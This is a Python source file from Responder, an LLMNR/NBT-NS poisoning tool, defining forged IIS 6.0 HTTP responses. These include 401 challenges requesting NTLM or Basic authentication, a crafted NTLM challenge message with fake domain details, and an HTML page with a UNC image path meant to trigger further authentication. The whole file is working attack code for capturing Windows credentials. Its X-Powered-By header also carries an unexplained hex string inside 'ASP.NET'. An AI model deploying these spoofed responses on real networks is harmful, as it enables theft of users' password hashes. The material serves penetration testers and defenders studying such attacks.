#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict
from base64 import b64decode,b64encode

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


#HTTP Packet used for further NTLM auth.
class IIS_Auth_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

#HTTP Packet Granted auth.
class IIS_Auth_Granted(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

#HTTP NTLM Auth
class NTLM_Challenge(Packet):
    fields = OrderedDict([
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  ""),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),             
    ])

    def calculate(self):
        ##First convert to uni
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
      
        ##Then calculate
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])

        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])

        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        #AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        #AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

#HTTP NTLM packet.
class IIS_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "WWW-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),                                            
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

#HTTP Basic answer packet.
class IIS_Basic_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: Basic realm=''\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])
